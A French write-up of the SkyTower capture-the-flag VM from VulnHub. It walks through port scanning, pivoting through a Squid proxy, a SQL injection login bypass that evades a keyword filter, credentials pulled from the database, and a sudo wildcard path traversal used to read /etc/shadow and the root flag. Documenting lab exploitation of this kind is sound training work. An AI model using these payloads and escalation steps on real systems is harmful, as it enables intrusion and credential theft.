# Solution du CTF SkyTower

In(tro)duction
--------------

[SkyTower](http://vulnhub.com/entry/skytower-1,96/) est le petit dernier (au moment de ces lignes) des CTF présents sur *VulnHub*. Il s'agit d'une VM Debian 64 bits. On dispose d'un disque virtuel au format VDI ainsi qu'un fichier vbox contenant différentes informations (comme l'adresse MAC originale).  

La seule description du CTF est la suivante :  

```plain
This was used at a local CTF security conference.
```

Ignition
--------

```plain
Nmap scan report for 192.168.1.84
Host is up (0.00021s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE    VERSION
22/tcp   filtered ssh
80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
|_http-title: Site doesn't have a title (text/html).
3128/tcp open     http-proxy Squid http proxy 3.1.20
|_http-methods: No Allow or Public header in OPTIONS response (status code 400)
|_http-title: ERROR: The requested URL could not be retrieved
```

Qui dit proxy dit potentiellement *CONNECT* permettant d’accéder à des ports internes (écoutant sur le *loopback*).  

J'ai récupéré *proxychains* mais ce dernier ne compile pas car le code n'est pas à jour :(  

Une recherche sur *GitHub* permet de trouver plusieurs versions forkées. Je me suis arrêté tout de suite sur [proxychains-ng](https://github.com/rofl0r/proxychains-ng) car le nom semblait prometteur.  

Une fois compilé, on modifie l'entrée *[ProxyList]* du fichier *src/proxychains.conf* pour la ligne suivante :  

```plain
http 192.168.1.84 3128
```

On fait passer *nmap* par le proxy *Squid* :  

```plain
./proxychains4 -f src/proxychains.conf nmap -p- -sT 127.0.0.1
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00070s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
```

On ne récupère que l'accès au SSH précédemment filtré. Ça nous servira sans doute plus tard.  

Mach 10
-------

Un petit scan avec *Wapiti* permet de trouver une faille d'injection SQL sur la page de login renvoyée par le serveur Apache (nb: le mot clé *common* est présent dans la version de dév, pas dans la version stable actuelle) :  

```plain
./bin/wapiti http://192.168.1.84/ -m "common,nikto,backup,htaccess"

[+] Lancement du module sql
Injection MySQL dans http://192.168.1.84/login.php via une injection dans le paramètre email
Evil request:
POST /login.php HTTP/1.1
Host: 192.168.1.84
Referer: http://192.168.1.84/
Content-Type: application/x-www-form-urlencoded

email=%BF%27%22%28&password=letmein

Injection MySQL dans http://192.168.1.84/login.php via une injection dans le paramètre password
Evil request:
POST /login.php HTTP/1.1
Host: 192.168.1.84
Referer: http://192.168.1.84/
Content-Type: application/x-www-form-urlencoded

email=default&password=%BF%27%22%28
```

Malheureusement *sqlmap* se casse les dents sur cette faille. On va devoir étudier ça nous même.  

Si on tente de bypasser l'authentification (saisie de *' or 1=1#* dans le champ email) on obtient l'erreur suivante :  

```plain
There was an error running the query [You have an error in your SQL syntax;
check the manual that corresponds to your MySQL server version for the right
syntax to use near '11#' and password=''' at line 1]
```

Il semble que certains mots clés soient directement retirés de la chaîne que l'on a passé.  

Même chose avec *' or 1 or 1;#* :  

```plain
... near '1 1;#' and password='''
```

et avec une tentative d'union (*' union select 1,1;#*) :  

```plain
... near '11;#' and password='''
```

Le script a l'air de retirer les *OR*, *AND*, virgules, égal et potentiellement d'autres caractères. Heureusement MySQL supporte une autre réprésentation de l'opérateur *OR*. On peut finalement bypasser l'authentification en saisissant l'email suivant :  

```plain
' || 1;#
```

Ce qui nous donne la page suivante :  

```plain
Welcome john@skytech.com

As you may know, SkyTech has ceased all international operations.

To all our long term employees, we wish to convey our thanks for your dedication and hard work.

Unfortunately, all international contracts, including yours have been terminated.

The remainder of your contract and retirement fund, $2 ,has been payed out in full to a secure account.
For security reasons, you must login to the SkyTech server via SSH to access the account details.

Username: john
Password: hereisjohn 

We wish you the best of luck in your future endeavors.
```

Atterissage
-----------

Maintenant avec des identifiants SSH en main, on ouvre un tunnel passant par le proxy *Squid* à l'aide de *socat* :  

```plain
socat TCP-LISTEN:9999,reuseaddr,fork PROXY:192.168.1.84:127.0.0.1:22,proxyport=3128
```

La connection passe (presque) comme dans du beurre :  

```plain
$ ssh john@127.0.0.1 -p 9999
john@127.0.0.1's password: 
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64

Funds have been withdrawn
Connection to 127.0.0.1 closed.
```

Essayons de faire éxécuter une autre commande :  

```plain
$ ssh john@127.0.0.1 -p 9999 /bin/bash
john@127.0.0.1's password: 
id
uid=1000(john) gid=1000(john) groups=1000(john)
tail .bashrc
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi

echo
echo  "Funds have been withdrawn"
exit
```

C'est donc le *.bashrc* qui nous éjecte. Il suffit de le déplacer pour ne plus avoir à sans soucier.  

```plain
john@SkyTower:~$ uname -a
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64 GNU/Linux
```

En dehors des utilisateurs habituels on trouve trois personnes dans */etc/passwd* :

```plain
john:x:1000:1000:john,,,:/home/john:/bin/bash
sara:x:1001:1001:,,,:/home/sara:/bin/bash
william:x:1002:1002:,,,:/home/william:/bin/bash
```

La liste des processus, services, crontab, setuids, setgids ne donne rien d'intéressant. Je décide de m'intéresser à la base de données MySQL.  

D'abord récupérer les identifiants dans */var/www/login.php* :  

```plain
<?php

$db = new mysqli('localhost', 'root', 'root', 'SkyTech');

if($db->connect_errno > 0){
    die('Unable to connect to database [' . $db->connect_error . ']');

}

$sqlinjection = array("SELECT", "TRUE", "FALSE", "--","OR", "=", ",", "AND", "NOT");
$email = str_ireplace($sqlinjection, "", $_POST['email']);
$password = str_ireplace($sqlinjection, "", $_POST['password']);

$sql= "SELECT * FROM login where email='".$email."' and password='".$password."';";
$result = $db->query($sql);

if(!$result)
    die('There was an error running the query [' . $db->error . ']');
if($result->num_rows==0)
    die('<br>Login Failed</br>');
// --- snip ---
```

On remarque au passage le filtrage qui est effectué.  

On trouve les trois users du système dans la BDD :  

```plain
mysql> select * from login;
+----+---------------------+--------------+
| id | email               | password     |
+----+---------------------+--------------+
|  1 | john@skytech.com    | hereisjohn   |
|  2 | sara@skytech.com    | ihatethisjob |
|  3 | william@skytech.com | senseable    |
+----+---------------------+--------------+
```

Le mot de passe de *sara* est valide sur le système mais là encore un *.bashrc* nous éjecte.  

J'édite le *.bashrc* via *su -c vi sara* (puis *:e .bashrc* depuis *Vi*) pour retirer les lignes qui posent problème.  

Mission accomplished
--------------------

*sara* a une autorisation spéciale *sudo* pour consulter le contenu de */accounts* (qui est vide) :  

```plain
sara@SkyTower:~$ sudo -l
Matching Defaults entries for sara on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
```

Seulement l'astérisque est pour le moins permissif et permet de remonter l'arborescence :  

```plain
sara@SkyTower:/var/www$ sudo /bin/cat /accounts/../etc/shadow
root:$6$rKYhh57q$AVs1wNVSbE5K.IU1Wp9l7Ndg3iPlB7yczctQD6OL9fBZir2ppGDA6v0Vx17xjg.b3zu6mkAVpEN2BuG3wvS2l/:16241:0:99999:7:::
--- snip ---
john:$6$a39powbs$ditVKZ1waa6vJEh3BG1d5jLv/uADKcl.r1kcA.XKyhNfJoiDhSdwmSZel3V5cZ/S6ec3wd8rdNA2dOznTXhl0/:16198:0:99999:7:::
sara:$6$2PvpHNG0$hbaMRd5fZhWMDHyyhGHINSy.qBHnvP4QW1k9RSwv.pQM6SoZey53C7S7aF6263ae6qx5TwVA6sahf5tebUqvY1:16198:0:99999:7:::
william:$6$c3VykdoT$qRUKl1e77skTm0sLHavRSp8mUJfMIPrJBovrXC8o9GY8/P7gpasSbvtqA0rn9.HyxjKhSVji8/CzHNFLit3GU1:16241:0:99999:7:::
```

Qu'il-y a t-il dans /root ?  

```plain
sara@SkyTower:~$ sudo /bin/ls /accounts/../root/ -al
total 36
drwx------  4 root root 4096 Jun 20 09:01 .
drwxr-xr-x 24 root root 4096 Jun 20 07:52 ..
drwx------  2 root root 4096 Jun 20 08:24 .aptitude
-rw-------  1 root root  204 Jun 20 09:01 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rwx------  1 root root   69 Jun 20 08:59 flag.txt
-rw-------  1 root root  268 Jun 20 07:42 .mysql_history
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
drwx------  2 root root 4096 Jun 20 07:48 .ssh

sara@SkyTower:~$ sudo /bin/cat /accounts/../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
```

Game over !
-----------



*Published June 29 2014 at 17:30*